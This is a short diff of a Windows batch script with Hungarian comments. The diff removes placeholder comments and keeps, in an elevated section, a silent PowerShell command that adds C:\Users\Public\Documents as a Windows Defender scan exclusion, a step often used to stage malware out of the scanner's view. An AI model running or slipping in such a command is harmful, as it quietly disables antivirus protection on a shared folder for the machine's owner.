@@ -15,12 +15,8 @@ IF %ERRORLEVEL% EQU 0 (
     exit
 
 :admin_folytatas
-REM -----------------------------------------------------
-REM IDE JOVENEK A FOFUNKCIO PARANCSAI
 
     POWERSHELL -InputFormat None -OutputFormat None -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'"
 
-
-REM A FOFUNKCIO PARANCSAI VEGE
-REM -----------------------------------------------------
 pause
+
